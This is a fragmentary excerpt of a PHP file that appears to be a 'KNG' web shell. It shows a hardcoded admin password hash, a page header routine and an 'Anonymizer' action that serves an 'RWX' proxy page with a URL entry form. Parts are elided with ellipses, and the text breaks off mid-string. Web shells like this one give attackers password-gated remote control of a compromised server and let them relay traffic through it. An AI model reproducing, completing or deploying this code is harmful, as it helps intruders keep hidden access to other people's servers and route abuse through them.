<?php
//-----------------Password---------------------
$_password = "18e4fdae3844b89d06458da5a7d9e9d2"; //admin
$_agent = true;
$_unicode = 'UTF-8';
$_action = 'Anonymizer';
...
function hardHeader() {
	...
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - KNG " . VERSION ."</title>
<style>
...
function actionAnonymizer() {
	...
	if (empty($url)) {
		if (empty($startURL)) {
			hardHeader();
			echo "<h1>RWX</h1><div class=content>Proxy can be directly invoked like this: <a href=\"" . PROXY_PREFIX . $landingExampleURL . "\" target='_blank'>" . PROXY_PREFIX . $landingExampleURL . "</a><br /><br />Or, you can simply enter a URL below:<br /><br /><form onsubmit=\"if (document.getElementById('site').value) { 
